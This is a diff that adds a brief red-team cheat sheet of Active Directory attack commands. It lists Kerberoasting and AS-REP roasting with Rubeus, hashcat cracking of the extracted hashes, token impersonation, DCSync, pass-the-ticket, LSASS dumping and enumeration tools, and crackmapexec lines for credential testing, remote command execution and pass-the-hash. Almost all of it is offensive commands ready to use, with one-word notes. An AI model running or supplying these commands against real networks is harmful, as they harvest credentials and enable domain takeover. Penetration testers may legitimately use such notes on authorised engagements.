@@ -1,0 +1,19 @@
+Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
+Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+
+make_token domain\user password
+rev2self
+
+dcsync fqdn domain\user (User must have DCSync rights)
+Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
+
+Seatbelt.exe system (Opsec Tool)
+SharpUp.exe (Privesc Tool)
+SharpDump.exe (LSASS MiniDump Tool)
+SharpView.exe (Enumeration)
+
+SharpHound.exe CollectionMethod All (SearchForest or Domain) Throttle 20 Jitter 7 EncryptZip ZipFileName C:\temp\stuff.zip NoSaveCache
+
+crackmapexec IP_Address -u username -p='password' (Test if you have access)
+crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
+crackmapexec IP -u username -H hash
